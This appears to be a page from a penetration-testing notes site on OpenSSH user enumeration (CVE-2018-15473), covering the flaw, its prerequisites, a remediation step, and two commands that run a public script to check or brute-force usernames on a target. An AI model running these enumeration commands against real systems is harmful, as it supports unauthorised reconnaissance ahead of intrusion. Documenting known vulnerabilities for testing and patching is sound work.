---
layout: default
title: SSH User Enumeration [CVE-2018-15473]
parent: Network
nav_order: 1
permalink: /network/ssh/
---

# SSH User Enumeration [CVE-2018-15473]
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an invalid authenticating user until after the packet containing the request has been fully parsed, related to auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.

## Prerequisites

* OpenSSH version prior to 7.7 is running on target.

## Exploit

To exploit this vulnerability, you can use [epi052](https://github.com/epi052/cve-2018-15473)'s script.

```bash
# For a single user.
./ssh-username-enum.py -u $username $target

# For brute-forcing.
./ssh-username-enum.py -p $port -t 10 -w $wordlist $target
```

## Recommendations

- [ ] Update OpenSSH to the latest version.